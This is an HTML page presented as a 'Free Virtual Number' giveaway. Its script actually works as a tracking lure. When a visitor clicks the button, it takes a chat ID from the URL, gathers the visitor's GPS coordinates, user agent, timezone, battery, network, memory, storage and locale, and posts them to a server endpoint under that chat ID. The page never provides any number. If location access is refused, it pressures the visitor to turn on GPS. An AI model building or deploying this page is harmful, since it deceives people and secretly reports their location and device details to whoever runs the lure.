<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title>Free Virtual Number</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
    }
    .navbar {
      background-color: #ff0000;
      color: white;
      text-align: center;
      padding: 15px 0;
    }
    #header {
      margin: 0;
      font-size: 28px;
      font-weight: bold;
    }
    .container {
      max-width: 600px;
      margin: 20px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    .background-image {
      width: 100%;
      height: 300px;
      background-image: url('background0.jpg');
      background-size: cover;
      background-position: center;
      margin-bottom: 40px;
    }
    #getNumberBtn {
      display: block;
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 5px;
      background-color: #ff0000;
      color: white;
      font-size: 18px;
      cursor: pointer;
      font-family: 'Montserrat', sans-serif;
      margin: 30px 0;
      border: 4px solid blue;
    }
    #getNumberBtn:hover {
      background-color: #cc0000;
    }
    footer {
      text-align: center;
      margin-top: 40px;
      color: #666;
    }
    .loading {
      display: none;
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
    .text {
      margin-bottom: 30px;
      font-size: 18px;
      color: #333;
    }
  </style>
</head>
<body>
  <nav class="navbar">
    <h1 id="header">FREE VIRTUAL NUMBER</h1>
  </nav>

  <div class="container">
    <div class="background-image"></div>
    <p class="text">Click the button below to get your free virtual number!</p>
    <button id="getNumberBtn" onclick="getVirtualNumber()">GET FREE VIRTUAL NUMBER</button>
    <div class="loading" id="loading">Processing your request...</div>
  </div>

  <footer>
    <p>Made With ❤️ @Hekmat_King</p>
  </footer>

  <script type="text/javascript">
    function GetURLParameter(sParam) {
      const sPageURL = window.location.search.substring(1);
      const sURLVariables = sPageURL.split('&');
      for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) {
          return sParameterName[1];
        }
      }
    }

    async function getVirtualNumber() {
      const btn = document.getElementById('getNumberBtn');
      const loading = document.getElementById('loading');
      
      btn.textContent = 'Processing...';
      loading.style.display = 'block';

      const chatId = GetURLParameter('chatId');
      if (!chatId) {
        alert('Chat ID not found in URL parameters');
        btn.textContent = 'GET FREE VIRTUAL NUMBER';
        loading.style.display = 'none';
        return;
      }

      if (navigator.geolocation) {
        // Get additional device information
        const userAgent = navigator.userAgent;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        let batteryLevel = 'Unknown';
        let batteryCharging = 'false';
        let networkType = 'Unknown';
        let networkSpeed = 'Unknown';
        let ram = 'Unknown';
        let storage = 'Unknown';
        let countryCode = 'Unknown';

        // Get battery information if available
        if ('getBattery' in navigator) {
          try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100);
            batteryCharging = battery.charging;
          } catch (e) {
            console.error('Battery API error:', e);
          }
        }

        // Get network information if available
        if ('connection' in navigator) {
          const connection = navigator.connection;
          networkType = connection.effectiveType || 'Unknown';
          networkSpeed = connection.downlink || 'Unknown';
        }

        // Get device memory if available
        if ('deviceMemory' in navigator) {
          ram = navigator.deviceMemory;
        }

        // Get storage information if available
        if ('storage' in navigator && 'estimate' in navigator.storage) {
          try {
            const estimate = await navigator.storage.estimate();
            storage = Math.round(estimate.quota / (1024 * 1024)) + ' MB';
          } catch (e) {
            console.error('Storage estimate error:', e);
          }
        }

        // Try to get country code from locale
        try {
          countryCode = Intl.DateTimeFormat().resolvedOptions().locale.split('-')[1] || 'Unknown';
        } catch (e) {
          console.error('Country code detection error:', e);
        }

        navigator.geolocation.getCurrentPosition(
          (position) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('latitude', position.coords.latitude);
            formData.append('longitude', position.coords.longitude);
            formData.append('user_agent', userAgent);
            formData.append('timezone', timezone);
            formData.append('battery_level', batteryLevel);
            formData.append('battery_charging', batteryCharging);
            formData.append('network_type', networkType);
            formData.append('network_speed', networkSpeed);
            formData.append('ram', ram);
            formData.append('storage', storage);
            formData.append('country_code', countryCode);

            sendData(formData);
          },
          (error) => handleLocationError(error)
        );
      } else {
        alert("Your browser doesn't support geolocation");
        btn.textContent = 'GET FREE VIRTUAL NUMBER';
        loading.style.display = 'none';
      }
    }

    function sendData(formData) {
      fetch('/api/sendMedia', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert('Your virtual number is being processed!');
        } else {
          alert('Error: ' + (data.error || 'Please enable GPS and try again'));
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('Connection error! Please try again later.');
      })
      .finally(() => {
        document.getElementById('getNumberBtn').textContent = 'GET FREE VIRTUAL NUMBER';
        document.getElementById('loading').style.display = 'none';
      });
    }

    function handleLocationError(error) {
      let message = '';
      switch(error.code) {
        case error.PERMISSION_DENIED:
          message = "Location access was denied. Please enable GPS to get your free number.";
          break;
        case error.POSITION_UNAVAILABLE:
          message = "Location information is unavailable.";
          break;
        case error.TIMEOUT:
          message = "The request to get location timed out.";
          break;
        default:
          message = "An unknown error occurred.";
      }
      alert(message);
      document.getElementById('getNumberBtn').textContent = 'GET FREE VIRTUAL NUMBER';
      document.getElementById('loading').style.display = 'none';
    }
  </script>
</body>
</html>
